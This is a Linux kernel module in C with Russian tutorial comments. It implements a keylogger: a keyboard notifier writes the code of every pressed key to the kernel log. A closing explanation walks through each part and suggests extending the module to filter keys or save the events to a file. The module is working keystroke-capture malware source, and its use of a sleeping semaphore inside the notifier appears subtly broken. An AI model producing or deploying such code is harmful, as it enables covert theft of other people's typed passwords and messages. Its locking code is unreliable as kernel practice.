#include <linux/module.h>      // Необходим для работы с модулями ядра (MODULE_LICENSE, module_init, module_exit)
#include <linux/kernel.h>      // Необходим для использования printk и некоторых других функций ядра
#include <linux/init.h>        // Необходим для использования макросов __init и __exit
#include <linux/keyboard.h>    // Позволяет взаимодействовать с клавиатурой через нотификаторы
#include <linux/semaphore.h>   // Для использования семафоров, которые помогают синхронизировать доступ к ресурсам

// Объект типа notifier_block, который будет использоваться для регистрации нашего модуля в цепочке обработчиков событий клавиатуры
static struct notifier_block nb;

// Семафор, чтобы избежать одновременного доступа к ресурсу из разных частей кода
static struct semaphore sem;

/**
 * Функция обратного вызова, которая вызывается при каждом нажатии клавиши.
 *
 * @param nb Указатель на notifier_block, связанный с этим обработчиком.
 * @param action Тип действия (например, нажатие или отпускание клавиши).
 * @param data Указатель на структуру keyboard_notifier_param, содержащую информацию о событии клавиатуры.
 *
 * @return NOTIFY_OK, чтобы сообщить системе, что событие было обработано.
 */
int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data) {
    // Преобразуем указатель data в структуру keyboard_notifier_param, содержащую информацию о клавиатурном событии
    struct keyboard_notifier_param *param = data;

    // Проверяем, что это событие нажатия клавиши (не отпускание)
    if (action == KBD_KEYSYM && param->down) {
        // Захватываем семафор перед доступом к критической секции
        down(&sem);
        // Выводим в лог ядра значение нажатой клавиши в шестнадцатеричном формате
        printk(KERN_INFO "Keylogger: Key pressed - %x\n", param->value);
        // Освобождаем семафор после выхода из критической секции
        up(&sem);
    }

    // Возвращаем NOTIFY_OK, чтобы сообщить системе, что событие было успешно обработано
    return NOTIFY_OK;
}

/**
 * Функция инициализации модуля. Вызывается при загрузке модуля в ядро.
 *
 * @return 0, если модуль успешно загружен, иначе ошибка загрузки.
 */
static int __init keylogger_init(void) {
    // Инициализируем семафор, устанавливая его начальное значение в 1
    sema_init(&sem, 1);

    // Указываем функцию обратного вызова (notifier_call) для обработки событий клавиатуры
    nb.notifier_call = keylogger_notify;

    // Регистрируем наш модуль в цепочке обработчиков клавиатуры
    register_keyboard_notifier(&nb);

    // Сообщаем в лог ядра, что модуль был успешно загружен
    printk(KERN_INFO "Keylogger Module: Loaded\n");

    // Возвращаем 0, что означает успешную загрузку модуля
    return 0;
}

/**
 * Функция выгрузки модуля. Вызывается при выгрузке модуля из ядра.
 */
static void __exit keylogger_exit(void) {
    // Отменяем регистрацию нашего модуля в цепочке обработчиков клавиатуры
    unregister_keyboard_notifier(&nb);

    // Сообщаем в лог ядра, что модуль был успешно выгружен
    printk(KERN_INFO "Keylogger Module: Unloaded\n");
}

// Указываем функции инициализации и завершения модуля, которые будут вызваны при его загрузке и выгрузке
module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");           // Указываем лицензию на модуль (GPL - GNU General Public License)
MODULE_AUTHOR("Ваше Имя");       // Указываем автора модуля
MODULE_DESCRIPTION("Простой модуль keylogger для отслеживания нажатий клавиш");  // Описание модуля

/*
Подробное описание каждого элемента:
Заголовочные файлы:

<linux/module.h>: Предоставляет макросы и функции для работы с модулями ядра.
<linux/kernel.h>: Включает базовые функции ядра, такие как printk, который используется для вывода сообщений в лог ядра.
<linux/init.h>: Содержит макросы __init и __exit, которые используются для определения функций инициализации и завершения модуля.
<linux/keyboard.h>: Предоставляет интерфейсы для работы с событиями клавиатуры, такие как notifier_block и keyboard_notifier_param.
<linux/semaphore.h>: Позволяет работать с семафорами для синхронизации доступа к ресурсам в многозадачной среде.
Объект notifier_block (nb):

Этот объект используется для регистрации вашего модуля в системе обработки событий клавиатуры. Он указывает, какая функция (в данном случае keylogger_notify) должна быть вызвана при событии клавиатуры.
Семафор (sem):

Семафор используется для синхронизации доступа к общим ресурсам. В этом случае, семафор гарантирует, что код внутри критической секции, где происходит вывод информации о нажатии клавиши, выполняется только одним потоком одновременно.
Функция keylogger_notify:

Эта функция вызывается всякий раз, когда происходит событие клавиатуры (например, нажатие или отпускание клавиши). Она проверяет, что событие связано с нажатием клавиши (param->down == 1), после чего выводит в лог ядра код нажатой клавиши.
Функция keylogger_init:

Это функция инициализации модуля, которая вызывается при его загрузке в ядро. Она инициализирует семафор, регистрирует модуль в системе обработки событий клавиатуры и выводит сообщение в лог ядра.
Функция keylogger_exit:

Это функция завершения модуля, которая вызывается при его выгрузке из ядра. Она отменяет регистрацию модуля и выводит сообщение в лог ядра.
Макросы module_init и module_exit:

Эти макросы указывают ядру, какие функции должны быть вызваны при загрузке и выгрузке модуля.
Метаинформация о модуле:

MODULE_LICENSE("GPL"): Указывает, что модуль распространяется под лицензией GPL.
MODULE_AUTHOR("Ваше Имя"): Указывает автора модуля.
MODULE_DESCRIPTION("Простой модуль keylogger для отслеживания нажатий клавиш"): Описание модуля, которое может быть полезно для других разработчиков или при отладке.
Этот модуль служит простым примером того, как можно работать с событиями в ядре Linux. Вы можете его модифицировать, добавляя, например, функционал фильтрации определённых клавиш или запись событий в файл.
*/